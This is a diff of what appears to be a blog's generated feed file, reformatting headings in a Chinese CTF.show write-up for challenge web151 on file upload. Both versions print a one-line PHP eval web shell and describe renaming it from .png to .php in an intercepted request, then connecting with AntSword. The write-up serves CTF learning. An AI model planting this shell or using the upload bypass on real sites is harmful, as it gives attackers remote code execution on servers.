@@ -8,7 +8,7 @@
       <link href="/2022/04/02/CTF-show-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
       <url>/2022/04/02/CTF-show-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
       
-        <content type="html"><![CDATA[<h3 id="1、web151"><a href="#1、web151" class="headerlink" title="1、web151"></a>1、web151</h3><p><strong>法一：抓包改后缀</strong></p><p>题目提示是前台校验，发现能上传图片，于是准备好的一句话木马改为png后缀上传再抓包</p><p><code>&lt;?php @eval($_POST[&#39;x&#39;]);?&gt;</code></p><p>将文件后缀修改为php再放包，可以看到文件上传成功</p><img src="https://gitee.com/mie1732/emc/raw/master/img/202204021653018.png" alt="修改为php后缀" style="zoom:80%;" /><img src="https://gitee.com/mie1732/emc/raw/master/img/202204021655028.png" alt="上传路径" style="zoom:80%;" /><p>上传成功后蚁剑连接即可得到flag</p><img src="https://gitee.com/mie1732/emc/raw/master/img/202204021659582.png" alt="蚁剑" style="zoom: 50%;" /><p><strong>法二：禁js</strong></p>]]></content>
+        <content type="html"><![CDATA[<h3 id="1、web151"><a href="#1、web151" class="headerlink" title="1、web151"></a>1、web151</h3><p>（1）法一：抓包改后缀</p><p>题目提示是前台校验，发现能上传图片，于是准备好的一句话木马改为png后缀上传再抓包</p><p><code>&lt;?php @eval($_POST[&#39;x&#39;]);?&gt;</code></p><p>将文件后缀修改为php再放包，可以看到文件上传成功</p><img src="https://gitee.com/mie1732/emc/raw/master/img/202204021653018.png" alt="修改为php后缀" style="zoom:80%;" /><img src="https://gitee.com/mie1732/emc/raw/master/img/202204021655028.png" alt="上传路径" style="zoom:80%;" /><p>上传成功后蚁剑连接即可得到flag</p><img src="https://gitee.com/mie1732/emc/raw/master/img/202204021659582.png" alt="蚁剑" style="zoom: 50%;" /><p>（2）法二：禁JS</p>]]></content>
       
       
       <categories>
